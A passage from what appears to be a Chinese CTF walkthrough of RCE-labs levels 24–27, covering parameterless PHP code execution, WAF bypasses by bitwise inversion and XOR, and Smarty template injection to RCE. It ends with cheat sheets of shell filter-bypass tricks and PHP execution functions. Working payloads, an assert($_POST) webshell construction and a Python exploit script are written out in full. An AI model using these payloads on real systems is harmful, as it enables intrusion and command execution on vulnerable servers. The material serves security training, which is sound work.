- `\((?R)?\)` — 一对括号，括号内可以递归匹配同样的模式
- 整体替换后如果只剩 `;`，说明输入只包含合法的 `函数名()` 嵌套调用加上分号

这意味着：**只能使用函数名加括号的形式，不能在括号中写任何参数！** 即 `函数1(函数2(函数3()))` 这种形式。

### 解题方法

**核心思路：** 利用不需要参数的 PHP 函数来获取信息、读取文件。

**Step 1：扫描当前目录**

```php
?code=var_dump(scandir(current(localeconv())));
```

函数链解析：
- `localeconv()` — 返回当前 locale 设置信息，其中包含 `.` 作为小数点字符
- `current()` — 返回数组的第一个元素，即 `.`（当前目录的字符串）
- `scandir()` — 扫描目录，返回文件名数组
- `var_dump()` — 输出数组内容

**Step 2：读取 flag 文件**

```php
?code=show_source(array_rand(array_flip(scandir(current(localeconv())))));
```

函数链解析：
- `scandir(current(localeconv()))` — 获取当前目录文件列表
- `array_flip()` — 交换数组的键和值（将文件名字符串变成键，数字索引变成值）
- `array_rand()` — 随机返回一个键（即随机返回一个文件名）
- `show_source()` — 语法高亮显示文件内容

由于 `array_rand()` 是随机的，需要多刷新几次直到随机到 `flag.php` 或 `get_flag.php`。

**Step 3：更精确的文件读取**

```php
?code=show_source(next(array_reverse(scandir(current(localeconv())))));
# 通过 array_reverse 和 next 的组合来定向选择特定位置的文件
```

### 无参 RCE 关键函数速查

| 类别 | 函数 | 作用 |
|------|------|------|
| **信息获取** | `localeconv()` | 返回包含 `.` 的数组 |
| | `getcwd()` | 返回当前工作目录路径 |
| | `getenv()` | 获取环境变量（无参获全量） |
| **外带参数** | `getallheaders()` | 获取所有 HTTP 请求头 |
| | `session_id()` | 获取/设置 session ID |
| | `get_defined_vars()` | 获取所有已定义变量 |
| **目录遍历** | `scandir()` | 扫描目录 |
| | `dirname()` | 返回路径的目录部分 |
| | `chdir()` | 改变当前目录 |
| **数组操作** | `current()` / `pos()` | 数组当前元素 |
| | `next()` / `prev()` | 下一个/上一个元素 |
| | `end()` / `reset()` | 最后一个/重置到第一个 |
| | `array_flip()` | 键值互换 |
| | `array_rand()` | 随机返回键 |
| | `array_reverse()` | 反转数组 |
| | `array_pop()` | 弹出最后一个元素 |
| **文件读取** | `show_source()` | 高亮显示文件源码 |
| | `readfile()` | 读取并输出文件 |
| | `highlight_file()` | 同 show_source() |
| | `file_get_contents()` | 读取文件到字符串 |
| | `readgzfile()` | 读取 gzip 或非压缩文件 |

---

## <a id="level-25"></a>Level 25 — 取反绕过

### 源码

```php
// index.php
<?php

function hello_code($code){
    if(preg_match("/[A-Za-z0-9]+/", $code)){    # 过滤所有字母和数字
        die("WAF!");
    }
    eval($code);
}

isset($_GET['code']) ? hello_code($_GET['code']) : null;
highlight_file(__FILE__);
?>
```

### 漏洞分析

本题是 Level 24（无参命令执行）的变种，但用了不同的 WAF：禁止所有字母和数字，而不是限制参数形式。

过 WAF 的核心技巧：**按位取反**。PHP 中 `~` 运算符会对字符串的每个字符进行按位取反操作。利用这一点可以编码任意函数名。

### 解题方法

**方法一：直接取反 Level 24 的 payload**

使用 [PHP-inversion 在线生成器](https://probiusofficial.github.io/PHP-inversion/)，输入 Level 24 的无参 payload：
```
show_source(array_rand(array_flip(scandir(current(localeconv())))))
```
生成取反后的形式，然后用 `~` 包裹：

```php
?code=(~%8C%86%8C%8B%9A%92)((~%9A%87%8A%8D%99%8A%95%8B)((~%9A%87%8A%8D%99%8A%95%8B)((~%8C%9A%8C%9B%9A%8D%9E)((~%99%9E%87%99%8D%9B%8A)((~%93%9A%9A%8D%93%8C%86%8A%8D%9B%9A)(~%D7%D5))))));
```

**取反生成算法：**
```javascript
// exp.html 中的 JS 代码
function one(s) {
    let result = "[~";
    for (let i = 0; i < s.length; i++) {
        let charCode = s.charCodeAt(i);
        let inverted = 255 - charCode;  // 255 - ord(char) = 取反
        let hex = inverted.toString(16).toUpperCase();
        if (hex.length < 2) hex = "0" + hex;
        result += "%" + hex;
    }
    result += "][!%FF](";
    return result;
}
# 例如 "show_source" →
# [~%8C%86%8C%8B%9A%92][!%FF](
# [~...][!%FF] 的作用：~取反后 !%FF (=!255=false=0) 取第0个元素即字符串本身
```

然后多刷新几次，直到 `array_rand` 随机到 flag 相关文件。

**方法二：定向读取**

如果不想依赖随机，可以使用更精确的数组定位：
```php
?code=(~%8C%86%8C%8B%9A%92)((~%99%9E%8D%9B)((~%9A%87%8A%8D%99%8A%95%8B)((~%8C%9A%8C%9B%9A%8D%9E)((~%99%9E%87%99%8D%9B%8A)(~%D7%D5))))));
# 相当于 show_source(end(scandir(getcwd())));
```

### 取反原理

PHP 中：
- 字符 'A' (ASCII 65) 取反：`~'A'` → 字符 chr(255 - 65) = chr(190)
- 对整个字符串取反：`~"ABC"` → 每个字符逐个取反
- 两次取反恢复原值：`~~"ABC"` = `"ABC"`

所以攻击流程是：
1. 先设计好要执行的函数调用链
2. 每个函数名用 `~` 包裹
3. 由于 `~` 后的结果是不可打印字符串，用 URL 编码传递

---

## <a id="level-26"></a>Level 26 — 无字母数字的代码执行

### 源码

```php
// index.php
<?php

highlight_file(__FILE__);

isset($_POST['code']) ? $code = $_POST['code'] : $code = null;

if(preg_match("/[a-z0-9]/is", $code)){    # 过滤所有大小写字母和数字
    die("WAF!");
} else {
    echo "Your Payload's Length : ".strlen($code)."<br>";
    eval($code);
}
?>
```

### 漏洞分析

最严格的限制：禁止 `a-z`, `A-Z`, `0-9`（`i` 修饰符使大小写不敏感）。可用字符包括：大写字母（被滤..等等，所有字母都被滤了）、特殊符号 `$`, `_`, `(`, `)`, `^`, `~`, `!`, `%`, `+`, `-`, `*`, `/`, `[`, `]`, `{`, `}`, `|`, `&`, `@` 等。

### 解题方法

#### 方法一：异或 (XOR)

PHP 中两个字符串可以逐字符异或：
```php
$_ = ('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');
// 结果: "assert"
print($_);   // 输出 "assert"
```

**原理：**
- `%01` (SOH) XOR `` ` `` (0x60) = 0x61 = 'a'
- `%13` (DC3) XOR `` ` `` = 0x73 = 's'
- `%05` (ENQ) XOR `` ` `` = 0x65 = 'e'
- `%12` (DC2) XOR `` ` `` = 0x72 = 'r'
- `%14` (DC4) XOR `` ` `` = 0x74 = 't'

**完整 payload：**
```php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');  // "assert"
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');       // "_POST"
$___=$$__;                                                       // $_POST
$_($___[_]);                                                     // assert($_POST[_])
```

POST 提交：
```
_=system('cat /flag')
```

#### 方法二：取反

利用 `~` 运算符取反：
```php
$_ = ~"%9e%8c%8c%9a%8d%8b";   // ~(取反) = "assert"
$__ = ~"%a0%af%b0%ac%ab";      // ~(取反) = "_POST"
$___ = $$__;                    // $_POST
$_($___[_]);                    // assert($_POST[_])
```

**URL 编码解码过程：**
- `%9e` → 字符 chr(0x9e)，取反 → chr(255-0x9e) = chr(97) = 'a'
- `%8c` → 字符 chr(0x8c)，取反 → chr(255-0x8c) = chr(115) = 's'
- `%8c` → 's'
- `%9a` → chr(0x9a)，取反 → chr(255-0x9a) = chr(101) = 'e'
- `%8d` → chr(0x8d)，取反 → chr(255-0x8d) = chr(114) = 'r'
- `%8b` → chr(0x8b)，取反 → chr(255-0x8b) = chr(116) = 't'

#### 方法三：PHP 自增（无数字无字母）

与 Level 23 相同，从 `[]` → `"Array"` → `"A"` 开始，通过自增构造所有字符。

---

## <a id="level-27"></a>Level 27 — Smarty 模板注入 (SSTI → RCE)

### 源码

```php
// index.php
<?php
require 'vendor/autoload.php';
use Smarty\Smarty;
$smarty = new Smarty();

if (isset($_GET['page']) && gettype($_GET['page']) === 'string') {
    $file_path = "file://" . getcwd() . "/pages/" . $_GET['page'];
    $smarty->display($file_path);    // 模板引擎渲染
} else {
    header('Location: /?page=home');
};
?>
```

### 漏洞分析

来自 idekCTF 2024 的题目。

**关键漏洞点：**
1. `$_GET['page']` 直接拼接到 `file://` 路径中，没有过滤路径穿越 `../`
2. `$smarty->display()` 会将模板文件编译为 PHP 并缓存到 `templates_c/` 目录
3. 编译后的文件名使用路径的 SHA1 哈希生成，可预测
4. 如果传入的路径构造得当，可以在模板名称中注入 Smarty 语法，进而触发 PHP 代码执行

### 解题方法

**Step 1：构造恶意的 `page` 参数**

```python
# 使用 {Closure::fromCallable(system)->__invoke("cat /flag-*")}
target_file = '../{Closure::fromCallable(system)->__invoke("cat /flag-*")}/../../pages/about'
```

这里利用了：
- `../` 路径穿越
- `{...}` Smarty 模板语法（PHP 的 Closure 类调用）
- `Closure::fromCallable(system)` 将 PHP 的 `system` 函数转换为闭包
- `->__invoke("cat /flag-*")` 调用闭包执行命令

**Step 2：计算编译后的缓存文件路径**

```python
import hashlib

cwd = '/app'
filehash = hashlib.sha1(
    f"//{cwd}/pages/{target_file}{cwd}/templates/".encode()
)
template_c_file = filehash.hexdigest() + "_0.file_" + target_file.split("/")[-1] + ".php"
template_c_file_path = "../templates_c/" + template_c_file
```

Smarty 的缓存文件名规则：`SHA1(模板文件完整路径 + 模板目录路径) + 后缀`，这个哈希值攻击者可以计算出来。

**Step 3：触发漏洞**

```python
# 第一次请求：触发 Smarty 编译并执行
w1 = requests.get(URL + "?page=" + quote(target_file))

# 第二次请求：访问编译后的 PHP 缓存文件
w2 = requests.get(URL + "?page=" + template_c_file_path)
print(w2.text)
```

### Smarty 模板注入详解

Smarty 是一个流行的 PHP 模板引擎。SSTI (Server-Side Template Injection) 漏洞的原理是：
1. 用户输入被嵌入到模板表达式中
2. 模板引擎将表达式解析为可执行代码
3. 攻击者注入恶意模板语法，触发任意代码执行

**Smarty 中常见的 RCE payload：**

| Payload | 说明 |
|---------|------|
| `{system('cat /flag')}` | 直接调用 PHP 函数（如果未禁用） |
| `{$smarty.template_object->fetch('...')}` | 利用 Smarty 对象方法 |
| `{Closure::fromCallable(system)->__invoke('cmd')}` | 利用 PHP 闭包（本题方法） |

---

## <a id="附录"></a>附录：速查表汇总

### A. Shell 特殊符号

| 符号 | 作用 | 示例 |
|------|------|------|
| `&&` | 逻辑与 | `cmd1 && cmd2` |
| `\|\|` | 逻辑或 | `cmd1 \|\| cmd2` |
| `\|` | 管道 | `cmd1 \| cmd2` |
| `;` | 命令分隔符 | `cmd1; cmd2` |
| `&` | 后台运行 | `cmd1 & cmd2` |
| `` ` `` | 命令替换 | `` `cmd` `` |
| `$()` | 命令替换 | `$(cmd)` |
| `>` | 覆盖重定向 | `cmd > file` |
| `<` | 输入重定向 | `cmd < file` |
| `>>` | 追加重定向 | `cmd >> file` |
| `<<<` | Here String | `cmd <<< "string"` |
| `<<` | Here Document | `cmd << EOF` |
| `\` | 转义/换行 | `l\ s` → `ls` |

### B. 绕过方法速查

| 绕过目标 | 技巧 | 示例 |
|----------|------|------|
| **关键词过滤** | 引号空字符 | `cat /f''lag` |
| | 通配符 | `cat /f*` `/???/?a?` |
| | 反斜杠 | `ca\t /fla\g` |
| | 变量拼接 | `a=c;b=at;$a$b /f*` |
| | 编码 | `echo Y2F01C9mbGFn \| base64 -d \| bash` |
| **空格过滤** | `$IFS` | `cat${IFS}/flag` |
| | TAB `%09` | `cat%09/flag` |
| | 重定向 `<` | `cat</flag` |
| | `{}`（bash） | `{cat,/flag}` |
| **字母过滤** | 八进制 | `$'\143\141\164'` |
| | 二进制替换 | `$((2#binary))` |
| | 取反 | `$((~$(...)))` |
| **斜杠 `/` 过滤** | HOME 截取 | `${HOME:0:1}` |
| | tr 映射 | `$(echo . \| tr '!-0' '"-1')` |
| **长度限制** | 文件聚合 | `>a; ls -t>a; sh a` |
| | 反斜杠拼接 | `l\` → `s\` → 合并为 `ls` |

### C. PHP 代码执行函数 (12个)

`eval()` · `assert()` · `call_user_func()` · `create_function()` · `array_map()` · `array_filter()` · `call_user_func_array()` · `usort()` · `array_reduce()` · `preg_replace(/e)` · `ob_start()` · `${}`

### D. PHP 命令执行函数 (6个)

`system()` · `exec()` · `shell_exec()` · `passthru()` · `popen()` · 反引号 `` ` ``

### E. 常用 Linux 读文件命令

`cat` · `tac` · `more` · `less` · `head` · `tail` · `nl` · `sort` · `od` · `rev` · `uniq` · `base64` · `xxd` · `file -f`

### F. PHP 无参 RCE 关键函数

| 类别 | 函数 |
|------|------|
| 获取当前目录 | `getcwd()`, `localeconv()` + `current()`, `dirname()` |
| 目录扫描 | `scandir()` |
| 数组操作 | `array_reverse()`, `array_flip()`, `array_rand()`, `next()`, `pos()`, `end()` |
| 外部数据 | `getallheaders()`, `session_id()`, `get_defined_vars()` |
| 文件读取 | `show_source()`, `readfile()`, `highlight_file()`, `file_get_contents()`, `readgzfile()` |

---

## 参考资源

- [RCE-labs GitHub](https://github.com/ProbiusOfficial/RCE-labs)
- [先知社区 - RCE 宝典](https://xz.aliyun.com/news/13873)
- [CTFshow - RCE 极限大挑战](https://dqgom7v7dl.feishu.cn/docx/YM0wdvMX2okGjbxlfz1c9ArwnE4)
- [BashFuck 在线生成器](https://probiusofficial.github.io/bashFuck/)
- [PHP-inversion 在线生成器](https://probiusofficial.github.io/PHP-inversion/)
- [PHP Filter Chain Exploit](https://probiusofficial.github.io/PHP-FilterChain-Exploit/)
- [P神 - 环境变量注入执行任意命令](https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html)
- [PHPinclude-labs (RFI 资源)](https://github.com/ProbiusOfficial/PHPinclude-labs)
{% endraw %}
